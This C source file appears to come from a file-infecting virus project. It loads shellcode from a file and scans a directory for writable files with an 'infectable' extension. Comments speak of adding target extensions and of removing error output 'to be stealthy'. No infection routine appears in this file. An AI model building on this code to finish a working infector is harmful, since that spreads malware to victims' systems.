#include "../includes/utils.h"

// FIXME: Remove, this is a debug function.
void DEBUG_print_shellcode(t_shellcode *shellcode) {
  for (size_t i = 0; i < shellcode->length; i++)
    write(STDOUT_FILENO, &shellcode->buf[i], 1);
}

long size_of_file(FILE *fp) {
  long size = 0;

  fseek(fp, 0, SEEK_END);
  size = ftell(fp);
  fseek(fp, 0, SEEK_SET);
  return (size);
}

// Reads a file into a t_shellcode* struct.
t_shellcode *read_shellcode(FILE *fp) {
  size_t total_bytes_read = 0;
  t_shellcode *shellcode = calloc(1, sizeof(t_shellcode));
  char *buf;
  int bytes_read = 1; // Set to 1 to begin the loop.

  if (!shellcode)
    return (NULL);
  shellcode->length = BLKSIZE;
  shellcode->buf = calloc(shellcode->length, sizeof(char));
  if (!shellcode->buf)
    return (NULL);
  buf = shellcode->buf;
  while (bytes_read > 0) { // Loops until reaching EOF or error.
    bytes_read = fread(buf, sizeof(char), BLKSIZE, fp);
    total_bytes_read += bytes_read;
    if (bytes_read == BLKSIZE) {
      shellcode->length += BLKSIZE;
      shellcode->buf = realloc(shellcode->buf, shellcode->length);
      buf = shellcode->buf + (shellcode->length - BLKSIZE);
    }
  }
  shellcode->length = total_bytes_read;
  shellcode->chunk_number = shellcode->buf[sizeof(int) * 2];
  return (shellcode);
}

// Always returns NULL.
void *free_file(t_file **file) {
  t_file *file_ptr = *file;
  if (!file || !file_ptr)
    return (NULL);
  if (file_ptr->absolute_path)
    free(file_ptr->absolute_path);
  if (file_ptr->filename)
    free(file_ptr->filename);
  free(*file);
  *file = NULL;
  return (NULL);
}

t_file *new_file(char *path, char *filename) {
  t_file *new;

  new = calloc(1, sizeof(t_file));
  if (!new)
    return (NULL);
  new->absolute_path = calloc(strlen(path) + strlen(filename) + 2, sizeof(char));
  if (!new->absolute_path)
    return (free_file(&new)); // Saves lines by returning the result of free file which will always be NULL.
  new->filename = calloc(strlen(filename) + 1, sizeof(char));
  if (!new->filename)
    return (free_file(&new));
  if (!strcpy(new->absolute_path, path))
    return (free_file(&new));
  strcat(new->absolute_path, "/");
  strcat(new->absolute_path, filename);
  if (!strcpy(new->filename, filename))
    return (free_file(&new));
  return (new);
}

// Used to free a t_list containing t_file structures.
void free_file_list(t_list **list) {
  t_list *list_ptr = *list;

  while (list_ptr != NULL) {
    if (list_ptr->data)
      free_file((t_file **)&list_ptr->data);
    list_ptr = list_ptr->next;
  }
  list_clear(list);
}

int check_extension(t_file *file) {
  static const char *infectable_extensions[] = { // TODO: Add more after testing.
    "infectable",
    NULL,
  };
  char *filename;
  char *token;
  char *last_token;

  filename = strdup(file->filename);
  strtok(filename, ".");
  for (;;) {
    token = strtok(NULL, ".");
    if (token != NULL)
      last_token = token;
    else
      break;
  }
  for (int i = 0; infectable_extensions[i] != NULL; i++) {
    if (infectable_extensions[i] && strcmp(last_token, infectable_extensions[i]) == 0) {
      free(filename);
      return (true);
    }
  }
  free(filename);
  return (false);
}

// Returns false on error and true on success.
int handle_regular_file(t_list *file_list, struct dirent *dir, char *root_path) {
  t_file *file;

  file = new_file(root_path, dir->d_name);
  if (!file)
    return (false); // Error.
  if (is_valid_target_file(file)) {
    if (!file_list->data)
      file_list->data = file;
    else
      list_add_front(&file_list, file);
  }
  else
    free_file(&file);
  return (true);
}

t_list *find_files(char *root_path) {
  DIR *root_directory = opendir(root_path);
  t_list *file_list;
  struct dirent *dir;

  if (!root_directory) {
    perror(root_path); // TODO: Remove to be stealthy.
    return (NULL);
  }
  file_list = new_list(NULL);
  if (!file_list)
    return (NULL);
  for (;;) {
    dir = readdir(root_directory);
    if (dir == NULL)
      break; // Breaks upon reaching the end of the directory entry.
    if (dir->d_type == DT_REG) {
      if (handle_regular_file(file_list, dir, root_path) != true) {
        free_file_list(&file_list);
        closedir(root_directory);
        return (NULL);
      }
    }
  }
  closedir(root_directory);
  return (file_list);
}

int is_valid_target_file(t_file *file) {
  if (access(file->absolute_path, W_OK) >= 0 && check_extension(file) != false)
    return (true);
  else return (false);
}
